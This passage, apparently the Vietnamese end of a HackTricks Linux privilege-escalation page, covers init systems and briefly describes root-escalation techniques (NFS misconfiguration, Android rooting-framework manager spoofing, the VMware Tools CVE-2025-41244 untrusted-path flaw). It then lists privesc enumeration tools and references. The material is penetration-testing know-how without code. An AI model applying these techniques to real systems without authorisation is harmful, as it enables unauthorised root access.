Thư mục `/etc/init.d` chứa các **script** dành cho System V init (SysVinit), **hệ thống quản lý dịch vụ Linux cổ điển**. Thư mục này bao gồm các script để `start`, `stop`, `restart` và đôi khi `reload` dịch vụ. Có thể thực thi chúng trực tiếp hoặc thông qua các symbolic link trong `/etc/rc?.d/`. Một đường dẫn thay thế trên các hệ thống Redhat là `/etc/rc.d/init.d`.

Mặt khác, `/etc/init` liên quan đến **Upstart**, một hệ thống **quản lý dịch vụ** mới hơn do Ubuntu giới thiệu, sử dụng các file cấu hình để quản lý dịch vụ. Dù đã chuyển sang Upstart, các script SysVinit vẫn được sử dụng song song với cấu hình Upstart nhờ lớp tương thích của Upstart.

**systemd** là một trình quản lý dịch vụ và khởi tạo hiện đại, cung cấp các tính năng nâng cao như khởi chạy daemon theo yêu cầu, quản lý automount và chụp ảnh trạng thái hệ thống. Các file được tổ chức trong `/usr/lib/systemd/` dành cho các gói phân phối và `/etc/systemd/system/` dành cho các thay đổi của quản trị viên, giúp đơn giản hóa quy trình quản trị hệ thống.<sup>[[21]](#references)</sup>

## Các thủ thuật khác

### Nâng quyền qua NFS


{{#ref}}
../../interesting-files-permissions/nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Thoát khỏi Shell bị giới hạn


{{#ref}}
../../main-system-information/escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
../../network-information/cisco-vmanage.md
{{#endref}}

## Framework rooting Android: lạm dụng manager-channel

Các framework rooting Android thường hook một syscall để cho phép manager ở userspace truy cập chức năng kernel có đặc quyền. Cơ chế xác thực manager yếu (ví dụ: kiểm tra chữ ký dựa trên thứ tự FD hoặc cơ chế mật khẩu kém) có thể cho phép một app cục bộ giả mạo manager và nâng quyền lên root trên các thiết bị đã được root. Tìm hiểu thêm và xem chi tiết khai thác tại đây:


{{#ref}}
../../software-information/android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## Khám phá service VMware Tools gây LPE (CWE-426) qua exec dựa trên regex (CVE-2025-41244)

Cơ chế khám phá service dựa trên regex trong VMware Tools/Aria Operations có thể trích xuất đường dẫn binary từ command line của tiến trình rồi thực thi binary đó với -v trong ngữ cảnh có đặc quyền. Các pattern quá rộng (ví dụ: dùng \S) có thể khớp với listener do attacker đặt sẵn ở vị trí có thể ghi (ví dụ: /tmp/httpd), dẫn đến thực thi với quyền root (CWE-426 Untrusted Search Path).<sup>[[27]](#references)</sup>

Tìm hiểu thêm và xem một pattern tổng quát có thể áp dụng cho các hệ thống khám phá/giám sát khác tại đây:

{{#ref}}
../../main-system-information/kernel-lpe-cves/vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Các biện pháp bảo vệ Kernel

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Trợ giúp thêm

[Binary impacket tĩnh](https://github.com/ropnop/impacket_static_binaries)

## Công cụ Privesc trên Linux/Unix

### **Công cụ tốt nhất để tìm các vector nâng quyền cục bộ trên Linux:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(tùy chọn -t)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Liệt kê các lỗ hổng kernel trên Linux và MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (truy cập vật lý):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Tổng hợp thêm các script**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [1] [0xdf – HTB Planning (nâng quyền qua giao diện Crontab UI, tái sử dụng thông tin đăng nhập zip -P)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [2] [0xdf – HTB Era: payload .text_sig giả mạo cho monitor được cron thực thi](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [3] [0xdf – Holiday Hack Challenge 2025: vượt qua Neighborhood Watch (chiếm quyền PATH qua sudo env_keep)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [4] [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [5] [Nâng quyền Linux cơ bản](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [6] [Hướng dẫn nâng quyền Linux](https://payatu.com/guide-linux-privilege-escalation/)
- [7] [Tấn công và phòng thủ: các kỹ thuật nâng quyền Linux năm 2016](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [8] [Không ai ngờ lại có thể thực thi lệnh!](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [9] [Sudo (LD_PRELOAD) (Nâng quyền Linux)](https://touhidshaikh.com/blog/?p=827)
- [10] [lpeworkshop – Hướng dẫn bài tập thực hành - Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [11] [frizb/Linux-Privilege-Escalation: mẹo và thủ thuật nâng quyền Linux](https://github.com/frizb/Linux-Privilege-Escalation)
- [12] [lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [13] [rtcrowley/linux-private-i: công cụ kiểm kê và nâng quyền Linux](https://github.com/rtcrowley/linux-private-i)
- [14] [Socket là gì?](https://www.linux.com/news/what-socket/)
- [15] [Bài viết phân tích Peppo (Proving Grounds)](https://muzec0318.github.io/posts/PG/peppo.html)
- [16] [Tìm hiểu về D-BUS](https://www.linuxjournal.com/article/7744)
- [17] [Nâng quyền Linux qua file thực thi SUID](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [18] [Sudo phần 2 – Nâng quyền Linux](https://juggernaut-sec.com/sudo-part-2-lpe)
- [19] [Cách quản lý ACL trên Linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [20] [Chiếm quyền root trên Redhat/CentOS qua network-scripts](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [21] [systemd là gì?](https://www.linode.com/docs/guides/what-is-systemd/)
- [22] [0xdf – HTB Eureka (chèn arithmetic trong bash qua log, chuỗi khai thác tổng thể)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [23] [Hướng dẫn GNU Bash – BASH_ENV (file khởi động không tương tác)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [24] [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [25] [0xdf – HTB Previous (sudo terraform dev_overrides + nâng quyền qua symlink TF_VAR)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [26] [0xdf – HTB Slonik (cron sao chép bằng pg_basebackup → bash SUID)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [27] [NVISO – Bạn đặt tên gì, VMware nâng quyền thứ đó (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [28] [Stratascale – CVE-2025-32463: nâng quyền qua Sudo Chroot](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)
- [29] [Rich Mirch – Lỗ hổng nâng quyền Sudo CVE-2025-32462 và CVE-2025-32463](https://blog.mirch.io/sudo-elevation-of-privilege-vulnerabilities/)
- [30] [0xdf – HTB: Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [31] [PEP 3147 – Thư mục lưu trữ PYC](https://peps.python.org/pep-3147/)
- [32] [Tài liệu Python importlib](https://docs.python.org/3/library/importlib.html)
- [33] [polkit/polkit vấn đề #74](https://gitlab.freedesktop.org/polkit/polkit/issues/74)
- [34] [mirchr/security-research](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh)
- [35] [Tweet của @paragonsec](https://twitter.com/paragonsec/status/1071152249529884674)
- [36] [redsiege.com - Ghi lại mật khẩu trên Linux](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux)
- [37] [tech.feedyourhead.at - Chi tiết về race condition của Logrotate](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)
- [38] [Tài liệu Python 3.10 – `site` và các file cấu hình đường dẫn](https://docs.python.org/3.10/library/site.html)
- [39] [0xdf – HTB: SmartHire](https://0xdf.gitlab.io/2026/09/26/htb-smarthire.html)
{{#include ../../../banners/hacktricks-training.md}}
